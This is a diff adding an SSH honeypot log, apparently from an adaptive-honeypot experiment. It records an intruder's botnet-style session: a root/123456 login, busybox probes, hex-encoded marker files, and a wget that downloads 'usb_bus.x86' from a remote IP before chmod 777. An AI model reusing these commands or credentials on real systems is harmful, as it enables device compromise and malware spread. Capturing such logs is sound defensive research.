@@ -1,0 +1,854 @@
+2017-12-19 12:36:32+0000 [kippo.core.honeypot.HoneyPotSSHFactory] New connection: 127.0.0.1:56675 (127.0.0.1:2222) [session: 0]
+2017-12-19 12:36:32+0000 [HoneyPotTransport,0,127.0.0.1] Remote SSH version: SSH-2.0-OpenSSH_6.2
+2017-12-19 12:36:32+0000 [HoneyPotTransport,0,127.0.0.1] kex alg, key alg: diffie-hellman-group1-sha1 ssh-rsa
+2017-12-19 12:36:32+0000 [HoneyPotTransport,0,127.0.0.1] outgoing: aes128-ctr hmac-md5 none
+2017-12-19 12:36:32+0000 [HoneyPotTransport,0,127.0.0.1] incoming: aes128-ctr hmac-md5 none
+2017-12-19 12:36:32+0000 [HoneyPotTransport,0,127.0.0.1] NEW KEYS
+2017-12-19 12:36:32+0000 [HoneyPotTransport,0,127.0.0.1] starting service ssh-userauth
+2017-12-19 12:36:32+0000 [SSHService ssh-userauth on HoneyPotTransport,0,127.0.0.1] root trying auth none
+2017-12-19 12:36:32+0000 [SSHService ssh-userauth on HoneyPotTransport,0,127.0.0.1] root trying auth keyboard-interactive
+2017-12-19 12:36:32+0000 [SSHService ssh-userauth on HoneyPotTransport,0,127.0.0.1] login attempt [root/123456] succeeded
+2017-12-19 12:36:32+0000 [SSHService ssh-userauth on HoneyPotTransport,0,127.0.0.1] root authenticated with keyboard-interactive
+2017-12-19 12:36:32+0000 [SSHService ssh-userauth on HoneyPotTransport,0,127.0.0.1] starting service ssh-connection
+2017-12-19 12:36:32+0000 [SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] got channel session request
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] channel open
+2017-12-19 12:34:24+0000 [SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] got global no-more-sessions@openssh.com request
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] pty request: xterm-256color (24, 80, 560, 336)
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Terminal size: 24 80 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] request_env: ' x00\x00\x00\x04LANG\x00\x00\x00\x0ben_IE.UTF-8'
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getting shell
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Opening TTY log: log/tty/20171219-123632-7481.log
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] /etc/motd resolved into /etc/motd
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: /bin/busybox cp
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command not found: /bin/busybox cp
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: /gweerwe323f
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command not found: /gweerwe323f
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: mount 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: mount
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] start to get action ..
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start mount
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ mount
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action ===================================
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 0.]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ********************  [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] saving the case ...
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving  [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Reading txtcmd from "/Users/sosdow/Documents/workspace/kippo/txtcmds/bin/mount"
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command not found: /gweerwe323f
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start echo
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ echo
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action ===================================
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: cat /dev/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: cat /dev/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start cat
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ cat
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action ===================================
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: rm -f /dev/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: rm -f /dev/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start rm
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ rm
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action ===================================
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: echo -e ' x47 x72 x6f x70/dev/shm' > /dev/shm/
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: echo -e ' x47 x72 x6f x70/dev/shm' > /dev/shm/
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start echo
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ echo
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action ===================================
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: cat /dev/shm/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: cat /dev/shm/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start cat
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ cat
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action ===================================
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: rm -f /dev/shm/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: rm -f /dev/shm/.nippon
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start rm
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ rm
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action ===================================
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1]
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start echo 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ echo 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action =================================== 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: cat /dev/pts/.nippon 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: cat /dev/pts/.nippon 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start cat 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ cat 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action =================================== 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: rm -f /dev/pts/.nippon 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: rm -f /dev/pts/.nippon 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start rm 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ rm 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action =================================== 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: cat /bin/echo  
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: cat /bin/echo 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start cat 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ cat 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action =================================== 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] /bin/echo resolved into /bin/echo 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: cd / 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: cd / 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] start to get action .. 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start cd 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ cd 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action =================================== 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] saving the case ... 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus  
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] isAllow start 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] case is saving  [  0.1          0.1         0.1] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start wget 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ wget 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action =================================== 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] CMD: chmod 777 usb_bus  
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Command found: chmod 777 usb_bus 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] start to get action .. 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] getAction start chmod 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] get current command -============================ chmod 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] do action =================================== 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 12:36:32+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,127.0.0.1] saving the case ... 
+2017-12-19 12:36:32+0000 [HoneyPotTransport,0,127.0.0.1] Got remote error, code 11 
+	reason: disconnected by user 
+2017-12-19 13:36:32+0000 [HoneyPotTransport,1,127.0.0.1] connection lost 
+2017-12-19 13:37:05+0000 [kippo.core.honeypot.HoneyPotSSHFactory] New connection: 127.0.0.1:56675 (127.0.0.1:2222) [session: 1] 
+2017-12-19 13:37:05+0000 [HoneyPotTransport,1,127.0.0.1] Remote SSH version: SSH-2.0-OpenSSH_6.2 
+2017-12-19 13:37:05+0000 [HoneyPotTransport,1,127.0.0.1] kex alg, key alg: diffie-hellman-group1-sha1 ssh-rsa 
+2017-12-19 13:37:05+0000 [HoneyPotTransport,1,127.0.0.1] outgoing: aes128-ctr hmac-md5 none 
+2017-12-19 13:37:05+0000 [HoneyPotTransport,1,127.0.0.1] incoming: aes128-ctr hmac-md5 none 
+2017-12-19 13:37:05+0000 [HoneyPotTransport,1,127.0.0.1] NEW KEYS 
+2017-12-19 13:37:05+0000 [HoneyPotTransport,1,127.0.0.1] starting service ssh-userauth 
+2017-12-19 13:37:05+0000 [SSHService ssh-userauth on HoneyPotTransport,1,127.0.0.1] root trying auth none 
+2017-12-19 13:37:05+0000 [SSHService ssh-userauth on HoneyPotTransport,1,127.0.0.1] root trying auth keyboard-interactive 
+2017-12-19 13:37:05+0000 [SSHService ssh-userauth on HoneyPotTransport,1,127.0.0.1] login attempt [root/123456] succeeded 
+2017-12-19 13:37:05+0000 [SSHService ssh-userauth on HoneyPotTransport,1,127.0.0.1] root authenticated with keyboard-interactive 
+2017-12-19 13:37:05+0000 [SSHService ssh-userauth on HoneyPotTransport,1,127.0.0.1] starting service ssh-connection 
+2017-12-19 13:37:05+0000 [SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] got channel session request 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] channel open 
+2017-12-19 13:37:05+0000 [SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] got global no-more-sessions@openssh.com request 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] pty request: xterm-256color (24, 80, 560, 336) 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Terminal size: 24 80 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] request_env: '\x00\x00\x00\x04LANG\x00\x00\x00\x0ben_IE.UTF-8' 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getting shell 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Opening TTY log: log/tty/20171219-133705-181.log 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] /etc/motd resolved into /etc/motd 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: /bin/busybox cp 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command not found: /bin/busybox cp 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: mount  
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: mount 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] start to get action .. 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start mount 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ mount 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] saving the case ... 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Reading txtcmd from "/Users/sosdow/Documents/workspace/kippo/txtcmds/bin/mount" 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command not found: /gweerwe323f
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: echo -e \x47\x72\x6f\x70/dev' > /dev/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: echo -e \x47\x72\x6f\x70/dev' > /dev/.nippon 
